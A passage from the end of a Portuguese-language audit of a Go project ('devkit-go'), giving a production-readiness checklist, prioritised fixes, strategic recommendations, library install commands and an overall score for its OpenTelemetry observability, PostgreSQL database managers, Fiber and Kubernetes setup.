- [ ] **Exporter timeout configurado** (≤10s)
- [ ] **Graceful shutdown exporta telemetria antes de morrer**
- [ ] **Alertas para telemetry export failures**

### Fiber (se usado)

- [ ] **otelfiber middleware registrado ANTES das rotas**
- [ ] **Todos handlers usam c.UserContext()**, nunca context.Background()
- [ ] **Error handling propaga erros para spans**
- [ ] **Health checks separados de rotas traced**

### Kubernetes

- [ ] **Readiness probe usa database.Ping()**
- [ ] **Liveness probe não depende de database**
- [ ] **terminationGracePeriodSeconds ≥ 30**
- [ ] **preStop hook permite flush de telemetria**
- [ ] **Resources limits configurados** (evita OOM)

### Security

- [ ] **DSN em secrets, não em código**
- [ ] **sslmode=disable proibido em produção**
- [ ] **TLS 1.2+ enforced**
- [ ] **Senhas nunca logadas** (URI sanitizada)
- [ ] **PII não aparece em traces/logs/métricas**

---

## 🎯 PRIORIZAÇÃO DE FIXES

### 🔥 CRÍTICO (Fix Imediatamente)

1. **Database sem observabilidade**
   - Impacto: Impossível debugar em produção
   - Esforço: Médio (usar DBManager A que criei)
   - Risco: Alto (voando cego)

2. **Shutdown perdendo telemetria**
   - Impacto: Traces/métricas incompletas
   - Esforço: Baixo (ordenar shutdowns)
   - Risco: Médio (perda de dados)

3. **Alta cardinalidade não bloqueada**
   - Impacto: Custo $$$ explosivo
   - Esforço: Médio (validar attributes)
   - Risco: Alto (fatura de $50k+)

### ⚠️ ALTO (Fix em 1-2 Sprints)

4. **URI validation ausente**
   - Impacto: Segurança comprometida
   - Esforço: Baixo (adicionar validateURI)
   - Risco: Médio (leak de dados)

5. **Duplicate provider não detectado**
   - Impacto: Memory leak + telemetria duplicada
   - Esforço: Baixo (singleton pattern)
   - Risco: Médio (custo + bugs sutis)

### 📌 MÉDIO (Backlog)

6. **Fiber integration incompleta**
   - Impacto: Desenvolvedores usam errado
   - Esforço: Baixo (adicionar exemplos)
   - Risco: Baixo (tracing não funciona)

7. **Exporter timeout não configurável**
   - Impacto: Export pode travar
   - Esforço: Baixo (adicionar timeout config)
   - Risco: Baixo (raro)

---

## 🚀 RECOMENDAÇÕES ESTRATÉGICAS

### Curto Prazo (Próximos 30 Dias)

1. **Migrar para DBManagers fornecidos**:
   - Use `postgres_otelsql` (DBManager A) para projetos com database/sql
   - Use `pgxpool_manager` (DBManager B) para novos projetos com Fiber
   - Benefício: Observabilidade imediata

2. **Implementar proteção de cardinalidade**:
   - Adicionar `sanitizeMetricAttributes()`
   - Bloquear keys de alta cardinalidade
   - Benefício: Previne custos explosivos

3. **Corrigir shutdown order**:
   - Reverter ordem de shutdown
   - Adicionar timeouts individuais
   - Benefício: Zero perda de telemetria

### Médio Prazo (2-3 Meses)

4. **Adicionar observabilidade em Kafka**:
   - Integrar `otelsarama`
   - Testar trace propagation Producer → Consumer
   - Benefício: Visibilidade end-to-end

5. **Implementar circuit breaker em exporters**:
   - Proteger app de collector instável
   - Degradar gracefully se exporter falhar
   - Benefício: Resiliência

6. **Criar dashboard de observabilidade**:
   - Grafana com métricas de pool
   - Alertas para saturação
   - Benefício: Proatividade

### Longo Prazo (6+ Meses)

7. **Migrar completamente para pgx**:
   - Substituir database/sql por pgx nativo
   - Benefício: Performance + context em Commit()

8. **Implementar distributed caching**:
   - Redis com otelsarama tracing
   - Benefício: Reduzir carga no DB

---

## 📚 REFERÊNCIAS E RECURSOS

### DBManagers Criados

1. **postgres_otelsql** (DBManager A)
   - Localização: `pkg/database/postgres_otelsql/`
   - Para: Projetos existentes com database/sql
   - Tracing: Automático via otelsql
   - README: `pkg/database/postgres_otelsql/README.md`

2. **pgxpool_manager** (DBManager B)
   - Localização: `pkg/database/pgxpool_manager/`
   - Para: Novos projetos + Fiber
   - Tracing: Nativo via pgx.QueryTracer
   - Exemplo completo: `pkg/database/pgxpool_manager/examples/fiber_complete/main.go`
   - README: `pkg/database/pgxpool_manager/README.md`

### Bibliotecas Recomendadas

```bash
# Tracing
go get github.com/XSAM/otelsql
go get go.opentelemetry.io/contrib/instrumentation/github.com/gofiber/fiber/otelfiber/v2
go get go.opentelemetry.io/contrib/instrumentation/github.com/Shopify/sarama/otelsarama

# Database
go get github.com/jackc/pgx/v5
go get github.com/jackc/pgx/v5/pgxpool

# Observability
go get go.opentelemetry.io/otel
go get go.opentelemetry.io/otel/exporters/otlp/otlptrace/otlptracegrpc
go get go.opentelemetry.io/otel/sdk
```

### Documentação Externa

- [OpenTelemetry Go Best Practices](https://opentelemetry.io/docs/languages/go/)
- [otelsql Documentation](https://github.com/XSAM/otelsql)
- [pgx Performance Guide](https://github.com/jackc/pgx/wiki/Performance)
- [Fiber Tracing Guide](https://docs.gofiber.io/api/middleware/otelfiber)
- [High Cardinality in Metrics](https://www.robustperception.io/cardinality-is-key)

---

## ✅ CONCLUSÃO

### Resumo

O projeto **devkit-go** tem uma base arquitetural **sólida** com Clean Architecture bem implementada, especialmente em `pkg/observability`. No entanto, há **gaps críticos** em `pkg/database` que tornam o sistema **não observável em produção**.

### Nota Geral: **7.5/10**

**Breakdown**:
- Arquitetura: 9/10 (excelente separação de concerns)
- Documentação: 9/10 (comentários detalhados e justificados)
- Observability: 4/10 (**database sem tracing, shutdown perde dados**)
- Segurança: 6/10 (validações ausentes, mas estrutura permite adicionar)
- Production-Ready: 5/10 (**não está pronto sem os fixes críticos**)

### Ação Imediata

**Não faça deploy em produção sem**:
1. Instrumentar database com OpenTelemetry (use DBManagers fornecidos)
2. Corrigir shutdown order (prevenir perda de telemetria)
3. Bloquear alta cardinalidade em métricas (prevenir custo explosivo)

### Próximos Passos

1. Revisar este documento com o time
2. Priorizar fixes críticos (1-3)
3. Testar DBManagers fornecidos em staging
4. Implementar alertas de observabilidade
5. Criar runbook para troubleshooting

---

**Fim da Análise** 🎯
